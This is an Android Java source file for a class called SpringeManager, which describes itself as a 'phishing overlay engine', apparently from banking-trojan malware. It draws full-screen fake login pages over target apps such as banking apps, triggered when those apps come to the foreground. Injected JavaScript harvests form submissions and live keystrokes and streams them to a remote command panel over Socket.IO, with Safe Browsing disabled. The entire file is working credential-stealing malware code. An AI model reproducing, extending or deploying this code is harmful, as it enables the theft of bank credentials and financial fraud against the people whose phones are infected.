package com.fason.app.features.springe;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.res.AssetManager;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * SpringeManager — phishing overlay engine.
 *
 * Renders a full-screen WebView (TYPE_APPLICATION_OVERLAY) on top of any app.
 * Pages are HTML templates stored in {@code assets/templates/}. The panel
 * can:
 *   • List available pages             — springe:list
 *   • Show a page by template filename — springe:show { page: "com.chase.intl.html" }
 *   • Auto-trigger when a package comes foreground — springe:configure { pkg, page }
 *   • Hide the overlay                 — springe:hide
 *   • Get status                       — springe:status
 *
 * When the victim submits the phishing form the JS bridge fires captureSubmit()
 * which forwards captured fields to the panel in real-time over Socket.IO.
 * The overlay auto-hides 800 ms after a successful submission.
 *
 * Template path convention: {@code assets/templates/<pkg>.html} or any .html filename.
 * The panel can also push raw HTML via the {@code html} field instead of a page name.
 */
public final class SpringeManager {

    private static final String TAG               = "Springe";
    private static final String TEMPLATES_DIR     = "templates";
    private static final String PAGES_DIR         = "pages";
    private static final long   AUTO_HIDE_DELAY   = 800;

    private static volatile SpringeManager instance;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private volatile WebView  webView;
    private volatile View     dimView;
    private volatile boolean  shown         = false;
    private volatile String   targetPackage = null;
    private volatile String   activePage    = null;          // current template name
    private volatile String   cachedHtml    = null;          // pre-loaded HTML
    private volatile boolean  smartTrigger  = false;

    private SpringeManager() {}

    public static SpringeManager getInstance() {
        if (instance == null) {
            synchronized (SpringeManager.class) {
                if (instance == null) instance = new SpringeManager();
            }
        }
        return instance;
    }

    // ── Asset listing ──────────────────────────────────────────────────────────

    /**
     * Returns all .html filenames available in {@code assets/templates/}.
     * Sent to panel on springe:list.
     */
    public JSONArray listAvailablePages() {
        JSONArray arr = new JSONArray();
        try {
            AssetManager am = FasonApp.getContext().getAssets();
            String[] files = am.list(TEMPLATES_DIR);
            if (files == null) return arr;
            for (String f : files) {
                if (f.endsWith(".html")) {
                    JSONObject entry = new JSONObject();
                    // Derive human-readable name from filename
                    String name = f.replace(".html", "");
                    int lastDot = name.lastIndexOf('.');
                    entry.put("file",    f);
                    entry.put("package", name);
                    entry.put("label",   lastDot >= 0
                        ? capitalize(name.substring(lastDot + 1)) : capitalize(name));
                    arr.put(entry);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "listAvailablePages failed", e);
        }
        return arr;
    }

    private static String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        return Character.toUpperCase(s.charAt(0)) + s.substring(1);
    }

    // ── Configure (arm smart trigger) ──────────────────────────────────────────

    /**
     * Pre-loads a template and arms the smart trigger for a target package.
     *
     * @param page    filename inside assets/templates/ (e.g. "com.chase.intl.html")
     * @param pkg     package to watch; null = trigger manually only
     * @param cmdId   command tracking id
     */
    public void configure(String page, String pkg, String cmdId) {
        try {
            String html = loadTemplate(page);
            if (html == null) {
                sendStatus("error:page_not_found:" + page, cmdId);
                return;
            }
            this.cachedHtml    = html;
            this.activePage    = page;
            this.targetPackage = pkg;
            this.smartTrigger  = (pkg != null && !pkg.isEmpty());
            sendStatus("configured", cmdId);
            Log.d(TAG, "Springe configured page=" + page + " pkg=" + pkg);
        } catch (Exception e) {
            Log.e(TAG, "configure failed", e);
            sendStatus("error:" + e.getMessage(), cmdId);
        }
    }

    // ── Show / Hide ───────────────────────────────────────────────────────────

    /**
     * Show an overlay.
     *
     * @param page     template filename (overrides cached); null = use cached
     * @param rawHtml  inline HTML (overrides both page and cached); null to skip
     * @param cmdId    command tracking id
     */
    public void show(String page, String rawHtml, String cmdId) {
        mainHandler.post(() -> {
            try {
                if (shown) hideInternal();

                String html;
                if (rawHtml != null && !rawHtml.isEmpty()) {
                    html = rawHtml;
                } else if (page != null && !page.isEmpty()) {
                    html = loadTemplate(page);
                    if (html == null) {
                        sendStatus("error:page_not_found:" + page, cmdId);
                        return;
                    }
                    activePage = page;
                    cachedHtml = html;
                } else if (cachedHtml != null) {
                    html = cachedHtml;
                } else {
                    sendStatus("error:no_content", cmdId);
                    return;
                }

                showOverlay(html, cmdId);
            } catch (Exception e) {
                Log.e(TAG, "show failed", e);
                sendStatus("error:" + e.getMessage(), cmdId);
            }
        });
    }

    public void hide(String cmdId) {
        mainHandler.post(() -> {
            hideInternal();
            sendStatus("hidden", cmdId);
        });
    }

    // ── Smart trigger (called from FasonAccessibilityService) ─────────────────

    public void onForegroundPackage(String pkg) {
        if (!smartTrigger || pkg == null || !pkg.equals(targetPackage) || shown) return;
        Log.d(TAG, "Smart trigger → " + pkg);
        show(activePage, null, null);
    }

    // ── State ─────────────────────────────────────────────────────────────────

    public boolean isShown()               { return shown; }
    public String  getTargetPackage()      { return targetPackage; }
    public boolean isSmartTriggerArmed()   { return smartTrigger; }
    public String  getActivePage()         { return activePage; }

    // ── Template loading ───────────────────────────────────────────────────────

    /**
     * Loads a template from assets/templates/.
     * Falls back to assets/pages/ for legacy compatibility.
     */
    private String loadTemplate(String filename) {
        if (filename == null || filename.isEmpty()) return null;
        // Sanitise — no path traversal
        String safe = filename.replace("/", "").replace("..", "");
        if (!safe.endsWith(".html")) safe = safe + ".html";

        String html = readAsset(TEMPLATES_DIR + "/" + safe);
        if (html == null) html = readAsset(PAGES_DIR + "/" + safe);
        return html;
    }

    private String readAsset(String path) {
        try (InputStream is = FasonApp.getContext().getAssets().open(path)) {
            byte[] buf = new byte[is.available()];
            int n = 0, read;
            while (n < buf.length && (read = is.read(buf, n, buf.length - n)) != -1) n += read;
            return new String(buf, 0, n, StandardCharsets.UTF_8);
        } catch (IOException ignored) {
            return null;
        }
    }

    // ── Overlay construction ───────────────────────────────────────────────────

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    private void showOverlay(String html, String cmdId) {
        Context ctx = FasonApp.getContext();
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (wm == null) {
            sendStatus("error:no_window_manager", cmdId);
            return;
        }

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        // Semi-transparent backdrop
        dimView = new View(ctx);
        dimView.setBackgroundColor(Color.argb(185, 0, 0, 0));
        WindowManager.LayoutParams dimLp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT);
        dimLp.gravity = Gravity.TOP | Gravity.START;
        wm.addView(dimView, dimLp);

        // WebView
        webView = new WebView(ctx);
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        ws.setAllowFileAccess(false);
        ws.setAllowContentAccess(false);
        ws.setGeolocationEnabled(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ws.setSafeBrowsingEnabled(false);
        }
        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest req) {
                // Block all navigation — overlay is self-contained
                return true;
            }
            @Override
            public boolean shouldOverrideUrlLoading(WebView v, String url) {
                return true;
            }
        });
        webView.addJavascriptInterface(new SpringeBridge(), "SpringeBridge");

        WindowManager.LayoutParams wvLp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT);
        wvLp.gravity = Gravity.TOP | Gravity.START;
        wm.addView(webView, wvLp);

        // Inject bridge helper so any template captures automatically
        String injected = injectBridgeHelper(html);
        webView.loadDataWithBaseURL("https://springe.local/", injected, "text/html", "UTF-8", null);

        shown = true;
        sendStatus("shown", cmdId);
        Log.d(TAG, "Springe overlay shown  page=" + activePage);
    }

    private void hideInternal() {
        try {
            Context ctx = FasonApp.getContext();
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                if (webView != null) {
                    try { webView.stopLoading(); webView.destroy(); } catch (Exception ignored) {}
                    try { wm.removeView(webView); } catch (Exception ignored) {}
                    webView = null;
                }
                if (dimView != null) {
                    try { wm.removeView(dimView); } catch (Exception ignored) {}
                    dimView = null;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "hide error", e);
        } finally {
            shown = false;
        }
    }

    // ── JS bridge injection ────────────────────────────────────────────────────

    /**
     * Injects a convenience snippet that auto-wires any form in the page to
     * SpringeBridge.captureSubmit() without requiring it in the template source.
     */
    private static String injectBridgeHelper(String html) {
        String script =
            "<script>\n" +
            "document.addEventListener('DOMContentLoaded',function(){\n" +
            "  function harvest(){\n" +
            "    var d={};\n" +
            "    document.querySelectorAll('input,select,textarea').forEach(function(el){\n" +
            "      var k=el.name||el.id||el.placeholder||el.type||'field';\n" +
            "      d[k]=el.value;\n" +
            "    });\n" +
            "    return d;\n" +
            "  }\n" +
            "  document.querySelectorAll('form').forEach(function(f){\n" +
            "    f.addEventListener('submit',function(e){\n" +
            "      e.preventDefault();\n" +
            "      var fields={};\n" +
            "      new FormData(f).forEach(function(v,k){fields[k]=v;});\n" +
            "      if(window.SpringeBridge) SpringeBridge.captureSubmit(JSON.stringify(fields));\n" +
            "    });\n" +
            "  });\n" +
            "  // SPA fallback: watch button clicks\n" +
            "  document.addEventListener('click',function(e){\n" +
            "    var btn=e.target.closest('button,[type=submit],[data-submit],[role=button]');\n" +
            "    if(!btn) return;\n" +
            "    var fields=harvest();\n" +
            "    if(window.SpringeBridge && Object.keys(fields).length>0){\n" +
            "      SpringeBridge.captureSubmit(JSON.stringify(fields));\n" +
            "    }\n" +
            "  });\n" +
            "  // Real-time field updates\n" +
            "  document.querySelectorAll('input,textarea').forEach(function(el){\n" +
            "    el.addEventListener('input',function(){\n" +
            "      var k=el.name||el.id||el.placeholder||el.type||'field';\n" +
            "      if(window.SpringeBridge) SpringeBridge.captureField(k,el.value);\n" +
            "    });\n" +
            "  });\n" +
            "});\n" +
            "</script>\n";

        int bodyClose = html.toLowerCase().lastIndexOf("</body>");
        if (bodyClose >= 0) return html.substring(0, bodyClose) + script + html.substring(bodyClose);
        return html + script;
    }

    // ── JavaScript bridge ──────────────────────────────────────────────────────

    private final class SpringeBridge {

        /** Called when victim submits the form — receives all form fields as JSON. */
        @JavascriptInterface
        public void captureSubmit(String jsonFields) {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE,      "capture");
                payload.put("fields",               new JSONObject(jsonFields));
                payload.put("page",                 activePage != null ? activePage : "");
                payload.put(Protocol.KEY_PACKAGE,   targetPackage != null ? targetPackage : "");
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                socket.emit(Protocol.SPRINGE, payload);
                Log.d(TAG, "Capture submitted");
                // Auto-dismiss after capture
                mainHandler.postDelayed(() -> {
                    hideInternal();
                    sendStatus("captured_and_hidden", null);
                }, AUTO_HIDE_DELAY);
            } catch (Exception e) {
                Log.e(TAG, "captureSubmit failed", e);
            }
        }

        /** Called when a single field changes — live keylogging of form inputs. */
        @JavascriptInterface
        public void captureField(String name, String value) {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE,      "field");
                payload.put("name",                 name);
                payload.put("value",                value);
                payload.put("page",                 activePage != null ? activePage : "");
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                socket.emit(Protocol.SPRINGE, payload);
            } catch (Exception ignored) {}
        }

        /** Programmatic dismiss from within the template. */
        @JavascriptInterface
        public void close() {
            mainHandler.post(() -> {
                hideInternal();
                sendStatus("closed_by_page", null);
            });
        }
    }

    // ── Status helper ──────────────────────────────────────────────────────────

    private void sendStatus(String status, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject d = new JSONObject();
            d.put(Protocol.KEY_TYPE,    "status");
            d.put(Protocol.KEY_STATUS,  status);
            d.put("shown",              shown);
            d.put("page",               activePage != null ? activePage : "");
            d.put("smartTrigger",       smartTrigger);
            if (targetPackage != null)  d.put(Protocol.KEY_PACKAGE, targetPackage);
            if (cmdId != null && !cmdId.isEmpty()) d.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.SPRINGE, d);
        } catch (Exception ignored) {}
    }
}
